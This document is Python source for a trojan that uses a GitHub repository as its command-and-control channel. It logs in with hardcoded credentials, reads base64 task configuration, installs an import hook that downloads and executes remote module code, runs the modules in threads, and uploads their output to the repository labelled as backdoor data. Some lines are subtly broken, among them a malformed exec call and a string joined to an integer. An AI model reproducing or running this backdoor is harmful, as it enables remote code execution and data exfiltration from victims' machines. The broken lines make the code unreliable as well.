import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

global red,blue,green,yellow,orange,teal,chrome,emphasis,reset,bold
red = '\033[91m'
blue = '\033[91m'
green = '\033[91m'
yellow = '\033[91m'
orange = '\033[91m'
teal = '\033[91m'
chrome = '\033[91m'
emphasis = '\033[101m'
reset = '\033[0m'
bold = '\033[2m'


trojan_id = "abc";

trojan_config ="config/"+ trojan_id +".json";

data_path = "data/"+trojan_id;

trojan_modules = [];

configured = False;

task_queue = queue.Queue();

def connect_to_github():
    gh = login(username="xxxkri",password="kridoesxxx1");
    repo = gh.repository("xxxkri","boom")
    branch = repo.branch("master");

    return gh,repo,branch;

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print(bold+red+"<xx>"+green+" Found Files:" +filepath+reset);
            blob = repo.blob(filename._json_data['sha']);
            return blob.content
        return None



def get_trojan_config():
    global configured;
    
    config_json = get_file_contents("README.md");
    
    config_json = base64.b64decode(config_json);
    print(config_json);

    config = json.loads(config_json);
    
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import "+task['module'])

    return config

def store_module_result(data) :
    gh,repo,branch = connect_to_github()
    remote_path = "data/"+trojan_id+"/"+random.randint(1000,100000)+".data";
    repo.create_file(remote_path,"Posting Backdoor Data",base64.b64encode(data))

    return

class gitimporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        
         if configured:
             print(bold+green+"<xx> Attempting to retrieve : "+fullname);
             new_library = get_file_contents(fullname);

             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library);
                 return self
         return None
    

    def load_module(self,name):
        module = imp.new_module(name);
        exec(self.current_module_code in module.__dict__)
        sys.modules[name] = module;

        return module;


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return

sys.meta_path = [gitimporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],));
            t.start()
            time.sleep(random.randint(1,10));













